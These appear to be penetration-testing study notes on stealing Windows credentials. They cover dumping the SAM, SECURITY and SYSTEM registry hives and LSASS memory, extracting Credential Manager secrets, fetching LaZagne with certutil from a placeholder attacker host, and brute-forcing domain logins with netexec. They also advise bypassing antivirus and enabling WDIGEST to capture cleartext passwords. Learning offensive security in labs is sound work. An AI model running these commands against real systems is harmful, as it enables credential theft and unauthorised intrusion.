The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (SIDs).

The security subsystem maintains security polices and user accounts on a machine. On a DC, these policies and accounts apply to the entire domain and are stored in Active Directory. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.

#### Windows authentication process diagram

![[Windows Authentication Process.png]]

`WinLogon` is a trusted system process, it's responsible for managing security-related user interacts, like:
- Launching `LogonUI` to prompt creds at login
- Handling password changes
- Locking & Unlocking the workstation

`WinLogon` is the only process that intercepts login requests from keyboard.

#### LSASS

Located at `%SystemRoot%\System32\Lsass.exe`in the file system

|**Authentication Packages**|**Description**|
|---|---|
|`Lsasrv.dll`|The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|`Msv1_0.dll`|Authentication package for local machine logons that don't require custom authentication.|
|`Samsrv.dll`|The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|`Kerberos.dll`|Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|`Netlogon.dll`|Network-based logon service.|
|`Ntdsa.dll`|Directory System Agent (DSA) that manages the Active Directory database (ntds.dit), processes LDAP queries, and handles replication between domain controllers. Only loaded on Domain Controllers.|

#### SAM database

The **Security Account Manager (SAM)** is a database in windows that stores user accounts credentials. It is used to authenticate both local and remote users. User passwords are stored as hashes in the registry, typically in the form of either `LM` or `NTLM` hashes
The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under `HKLM\SAM`. Viewing or accessing this file requires `SYSTEM` level privileges.

To improve protection from online cracking, Windows introduced `SYSKEY` in Windows NT 4.0, when enabled, `SYSKEY` partially encrypts the SAM file on the disk.

#### Credential Manager

![[Windows CredManager.png]]

Credentials Manager is a windows built-in feature that allow users to store and manage creds used to access network resources, websites, and applications. The credentials are encrypted and stored in the following location:

```powershell
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

#### NTDS

It's common to encounter windows systems joined in a windows domain. This setup simplifies centralized management for administrators. In such environments, logon requests are sent to the Domain Controller in the Forest. Each DC has a file called `NTDS.dit`, and it's synchronized across all DCs. 

`NTDS.dit` is a database that stores including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

---
# Attacking SAM, SYSTEM, and SECURITY

## Registry Hives

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
We can back up these hives using the `reg.exe` utility.
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

```powershell
reg.exe save hklm\sam C:\sam.save 
# The operation completed successfully.

reg.exe save hklm\system C:\system.save 
# The operation completed successfully. 

reg.exe save hklm\security C:\security.save 
# The operation completed successfully.
```

Then we can move the saved files to our attacker machine.

**Using Impacket SMB Server:**

```sh
sudo smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Then we can do:

```powershell
move sam.save \\10.10.15.16\CompData
```

## Dumping hashes with secretsdump

```sh
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Hashes Output Format:**

```sh
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

```ad-note
Most modern Windows operating systems store passwords as `NT hashes`

---

Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as `LM hashes`
```

## Cracking hashes with Hashcat

```sh
sudo hashcat -m 1000 hashestocrack.txt
```

## DCC2 Hashes

`hklm\security` contains cached domain logon information, specifically the form of DCC2 hashes. These are local, hashed copies of network credentials hashes.

```sh
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

```sh
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

## DPAPI

We previously saw **machines and user keys** for **DPAPI** also dumped from `hklm\security`, **DPAPI** is an API for windows used to encrypt and decrypt data blobs on a per-user basis.

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

```ad-note
DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
```

![[DPAPI Dump.png]]
## Remote dumping & LSA secrets considerations

When we have **Local Admin Access** on a host, we can dump LSA secrets over network.

### Dumping LSA Remotely

```sh
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping SAM Remotely

```sh
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

---
# Attacking LSASS

![[Attacking LSASS.png]]

LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

## Dumping LSASS process memory

It is advised to generate a dump file for the LSASS process then extract the credentials offline using our attack host. We are going to cover some techniques to complete this operation.
### Task Manager method

The Task Manager method is dependent on us having a GUI-based interactive session with a target.

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

### Rundll32.exe & Comsvcs.dll method

It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before creating the dump file, we must determine the `PID` assigned to the `lsass.exe` process. This can be done using CMD/PowerShell:

**Finding LSASS's PID in CMD**

```PowerShell
tasklist /svc
```

**Finding LSASS's PID in PowerShell**

```PowerShell
Get-Process lsass
```

Once we have the PID assigned to the LSASS process, we can create a dump file.

#### Creating a dump file using PowerShell

With an elevated PowerShell session, we can issue the following command to create a dump file:

```PowerShell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump PID C:\lsass.dmp full
```

With this command we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which is also calls the `MiniDumpWriteDump` (`MiniDump`) function to dump the LSASS.

> [!danger]
> Recall that this approach is recognized as malicious and most AVs will prevent it from execution. We need to find ways to bypass or disable AV tool we're facing.

## Using Pypykatz to extract credentials

```sh
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

We use `lsa` in the command because LSASS is a subsystem of `LSA`, then we specify data source as `minidump`.

**Details about expected output:**

***MSV:*** an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.

![[MSV.png]]


***WDIGEST:*** an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in **clear-text**. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text.

![[WDIGEST.png]]

```ad-note
Based on my personal experience in real-world pentest engagements, we can enable WDIGEST on target machines after getting administrative access on them by modifying the registry. Then we can wait for a high value target to login on the device so we extract its password
```


***Kerberos:*** a network authentication protocol used by Active Directory in Windows Domain environments. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos.

```txt
== Kerberos ==
	Username: bob
	Domain: DESKTOP-33E7O54
```

***DPAPI:*** `Mimikatz` and `Pypykatz` can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can be used to decrypt the secretes associated with each application using DPAPI.

![[Pypykatz DPAPI.png]]

#### Cracking the NT Hash with Hashcat

```sh
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

# Attacking Windows Credential Manager

Credentials are stored in special encrypted folders on the computer under the user and system profiles ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains `Policy.vpol` file with AES keys that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of `Credential Guard` to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

|Name|Description|
|---|---|
|Web Credentials|Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.|
|Windows Credentials|Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.|

It is possible to export **Windows Vaults** to `.crd` file via Control Panel or the following command:

```powershell
rundll32 keymgr.dll,KRShowKeyMgr
```

Backups created are encrypted with a user supplied password and can be imported to other windows hosts.

## Enumerating credentials with cmdkey

Enumerate credentials in the current user profile using `cmdkey`

```powershell
cmdkey /list
```

Stored credentials are listed with the following format:

|Key|Value|
|---|---|
|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
|User|The user account associated with the credential.|
|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|
**Abuse Example:**

```txt
Target: Domain:interactive=SRV01\mcharles 
Type: Domain Password 
User: SRV01\mcharles
```

**Interactive** means credentials can be used for interactive logon. When we see this kind of credentials, we can use `runas` to impersonate the user with stored creds:

```powershell
runas /savecred /user:SRV01\mcharles cmd
```

## Extracting credentials with Mimikatz

```powershell
privilege::debug
sekurlsa::credman
```

```ad-resources
Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).
```

**LaZagne Usage Example:**

```powershell
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe

certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe" C:\Windows\Temp\lazagne.exe

C:\Windows\Temp\lazagne.exe all
```

# Attacking Active Directory and NTDS.dit

![[Attacking AD & NTDS.png]]

When a Windows system join a domain, it will not reference to the SAM database to validate logon requests. The domain-joined system will now send auth requests to be validated by the domain controller.

Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:

| **Username convention**             | Practical example for `Jane Jill Doe` |
| ----------------------------------- | ------------------------------------- |
| `firstinitiallastname`              | jdoe                                  |
| `firstinitialmiddleinitiallastname` | jjdoe                                 |
| `firstnamelastname`                 | janedoe                               |
| `firstname.lastname`                | jane.doe                              |
| `lastname.firstname`                | doe.jane                              |
| `nickname`                          | doedoehacksstuff                      |

```ad-caution
Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like **a907** (or something similar) back to **joe.smith**. That way, email messages can get through, but the actual internal username isn't disclosed, making password spraying harder.
```

We can use automated tools to generate usernames such as: [username-anarchy:](https://github.com/urbanadventurer/username-anarchy).

**Example Usage:**

```sh
./username-anarchy -i /home/ltnbob/names.txt

# Output
ben 
benwilliamson 
ben.williamson 
benwilli 
benwill 
benw 
b.williamson 
bwilliamson 
wben 
w.ben 
williamsonb 
williamson 
williamson.b 
williamson.ben 
bw 
bob
...SNIP...
```

#### Enumerating valid usernames with Kerbrute

![[kerbrute.png]]
#### Launching a brute-force attack with NetExec

```sh
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

